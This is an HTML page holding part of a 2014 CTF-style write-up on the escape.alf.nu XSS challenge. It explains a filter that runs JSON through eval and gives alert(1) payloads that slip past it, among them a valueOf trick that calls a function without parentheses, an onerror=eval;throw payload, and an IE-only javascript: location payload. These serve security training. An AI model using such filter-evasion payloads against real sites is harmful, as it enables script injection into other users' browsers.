<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">console</span>.log(<span class="string">"junk_string"</span>) &lt; <span class="regexp">/junk_regexp/</span> ; alert(<span class="number">1</span>) <span class="comment">// --&gt;</span></div></pre></td></tr></table></figure>

<p>Where:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">junk_string</span>: <span class="string">&lt;!—&lt;script&gt;</span></div><div class="line"><span class="attribute">junk_regexp</span>: <span class="string">script&gt;&lt;script&gt;console.log(“)</span></div></pre></td></tr></table></figure>

<p>Actually you can see in the console that the first console.log writes ‘&lt;!—“script”’</p>
<p>In order to make it even shorter we can replace “//” with unicode \u2028 as suggested by Mario</p>
<h3 id="Level_16:">Level 16:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(text)</span> </span>{</div><div class="line">	<span class="comment">// *cough* not done</span></div><div class="line">	<span class="keyword">var</span> i = <span class="number">0</span>;</div><div class="line">	<span class="built_in">window</span>.the_easy_but_expensive_way_out = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{ alert(i++) };</div><div class="line">	<span class="comment">// "A JSON text can be safely passed into JavaScript's eval() function</span></div><div class="line">	<span class="comment">// (which compiles and executes a string) if all the characters not</span></div><div class="line">	<span class="comment">// enclosed in strings are in the set of characters that form JSON</span></div><div class="line">	<span class="comment">// tokens."</span></div><div class="line">	<span class="keyword">if</span> (!(<span class="regexp">/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(</div><div class="line"> text.replace(<span class="regexp">/"(\\.|[^"\\])*"/g</span>, <span class="string">''</span>)))) {</div><div class="line">		<span class="keyword">try</span> {</div><div class="line">		<span class="keyword">var</span> val = <span class="built_in">eval</span>(<span class="string">'('</span> + text + <span class="string">')'</span>);</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">''</span> + val);</div><div class="line">		} <span class="keyword">catch</span> (_) {</div><div class="line">		 <span class="built_in">console</span>.log(<span class="string">'Crashed: '</span>+_);</div><div class="line">			}	</div><div class="line">		} <span class="keyword">else</span> {</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'Rejected.'</span>);</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>

<p>This level is based on a real world filter described by Stefano Di Paola in this post</p>
<p>If we study the regexp carefully we will see that the letter “s” is allowed since its within the “u-r” interval, that allows us to use the word “self” and with that we can craft a valid JSON payload. The trick is that we will be adding “0” to our object so the JS engine will need to calculate the valueOf our object. So if we define the “valueOf” function as the “the_easy_but_expensive_way_out” global function, we will be able to invoke it during the arithmetic operation. The problem is that it will alert “0” since “i” its initialized with “0”, but we can do it twice to alert a “1”.</p>
<p>Long Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">{	</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}+<span class="number">0</span>,</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"the_easy_but_expensive_way_out"</span>]</div><div class="line">}</div></pre></td></tr></table></figure>

<p>That is a nice trick to execute a function when parenthesis are not allowed. But there some more like Gareth famous one:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span>[<span class="string">'=1;alert\x281\x29'</span>]</div></pre></td></tr></table></figure>

<p>You can get a shorter solution for IE only as explained by Stefano Di Paola in his post</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">{</div><div class="line">	<span class="string">"valueOf"</span><span class="symbol">:self</span>[<span class="string">"location"</span>],<span class="string">"toString"</span><span class="symbol">:[]</span>[<span class="string">"join"</span>],</div><div class="line">	<span class="number">0</span><span class="symbol">:<span class="string">"javascript:alert(1)"</span></span>,<span class="string">"length"</span><span class="symbol">:</span><span class="number">1</span></div><div class="line">}</div></pre></td></tr></table></figure>

<p>And thats all folks, thanks for reading!</p>
<h2 id="Part1"><a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">Part1</a></h2>

      
    </div>
    <footer>
      

        
          <div class="alignleft post-nav">
            <em>上一篇: </em><a href="/2014/10/12/escape-alf-nu-write-ups-1/">escape-Write-ups (Part 1)</a>
          </div>
        
        

        
          <div class="copyright">
            
              <span class="claim">版权声明：自由转载-非商用-无演绎-保持署名 @ evilddog-2014</span>
            
            
              <span class="from-link">
                <em>本文链接地址:</em>
                <a href="/2014/10/12/escape-alf-nu-write-ups-2/">
                  http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/
                </a>
              </span>
            
          </div>
        
        
  
  <div class="categories">
    <a href="//categories/前端安全/">前端安全</a>
  </div>

        
  
  <div class="tags">
    <a href="//tags/XSS/">XSS</a>
  </div>

        
  <div class="addthis addthis_toolbox addthis_default_style">
    
    
    
      <a class="addthis_button_sinaweibo_like"></a>
    
    
    
      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
    
    
    <a class="addthis_counter addthis_pill_style"></a>
  </div>
  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>

      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>


<section id="comment">
  <h1 class="title">留言</h1>
  <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="/disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  </div>
</section>
</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="text" name="q" results="0" placeholder="搜一下">
    <i class="icon-search"></i>
    <input type="hidden" name="q" value="site:evilddog.github.io">
  </form>
</div>

  <div>

<div class="widget tag">
    <h3 class="title">友链</h3>
    <ul class="entry">

          <li>
            <a href="http://lightless.me/" target="_blank">    Lightless</a>
          </li>
        
          <li>
            <a href="http://pandamystery.github.io" target="_blank">    Panda</a>
          </li>

          <li>
            <a href="http://www.nohackair.net/" target="_blank">    Airbasic</a>
          </li>

          <li>
            <a href="http://www.evilmoon.net/" target="_blank">    Evilmoon</a>
          </li>

          <li>
            <a href="http://homeway.me/" target="_blank">    Grass</a>
          </li>

          <li>
            <a href="http://tobe.moe/" target="_blank">     OctaviusLiu</a>
          </li>
        
          <li>
            <a href="http://Edward-L.github.io/" target="_blank">    Edward-L</a>
          </li>
        
          <li>
            <a href="http://queengina.com/" target="_blank">    QueenGina</a>
          </li>
        
          <li>
            <a href="http://veightz.net/" target="_blank">    Veightz</a>
          </li>
    <ul/>      
     
</div>

</div>

  
<div class="widget tag">
  <h3 class="title">标签</h3>
  <ul class="entry">
  
    <li><a href="/tags/BackBox/">BackBox</a><small>1</small></li>
  
    <li><a href="/tags/HTTP/">HTTP</a><small>1</small></li>
  
    <li><a href="/tags/HTTPS/">HTTPS</a><small>1</small></li>
  
    <li><a href="/tags/Nmap/">Nmap</a><small>1</small></li>
  
    <li><a href="/tags/XSS/">XSS</a><small>2</small></li>
  
    <li><a href="/tags/curl/">curl</a><small>1</small></li>
  
    <li><a href="/tags/png/">png</a><small>1</small></li>
  
    <li><a href="/tags/write-up/">write-up</a><small>1</small></li>
  
    <li><a href="/tags/同源策略/">同源策略</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/CTF/">CTF</a><small>2</small></li>
  
    <li><a href="/categories/HTTP/">HTTP</a><small>2</small></li>
  
    <li><a href="/categories/Linux/">Linux</a><small>1</small></li>
  
    <li><a href="/categories/Tools/">Tools</a><small>2</small></li>
  
    <li><a href="/categories/前端安全/">前端安全</a><small>2</small></li>
  
    <li><a href="/categories/浏览器安全/">浏览器安全</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="2014/11/10/png-struct/">PNG图片结构分析和取证</a>
      </li>
    
      <li>
        <a href="2014/11/09/file-header/">各类文件的文件头</a>
      </li>
    
      <li>
        <a href="2014/11/05/curl/">cURL 常用命令</a>
      </li>
    
      <li>
        <a href="2014/11/02/backbox/">Backbox</a>
      </li>
    
      <li>
        <a href="2014/11/01/swpu-write-up/">某石油大学CTFwrite-up</a>
      </li>
    
      <li>
        <a href="2014/10/31/HTTP/">浅谈HTTPS</a>
      </li>
    
      <li>
        <a href="2014/10/28/nmap-1/">浅谈Nmap基本原理</a>
      </li>
    
      <li>
        <a href="2014/10/24/http-max-connection/">浅谈浏览器最大并发连接数问题</a>
      </li>
    
      <li>
        <a href="2014/10/13/same-origin-policy/">浅谈浏览器的同源策略</a>
      </li>
    
      <li>
        <a href="2014/10/12/escape-alf-nu-write-ups-1/">escape-Write-ups (Part 1)</a>
      </li>
    
      <li>
        <a href="2014/10/12/escape-alf-nu-write-ups-2/">escape-Write-ups (Part 2)</a>
      </li>
    
  </ul>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <div id="go-pg-top"><i class="icon-arrow-up"></i></div>
  <footer id="footer" class="inner">
<div class="alignright">
  
  &copy; 2014 evilddog
  
  自豪地使用伟大的<a href="https://pages.github.com/"> Github Page <a/>
</div>
<div class="clearfix"></div></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<script type="text/javascript">
var disqus_shortname = 'evilddog';

(function(){
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
}());
</script>



<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript" charset="utf-8" src="/js/page.js"></script>

</body>

<div id="fb-root"></div>

</html>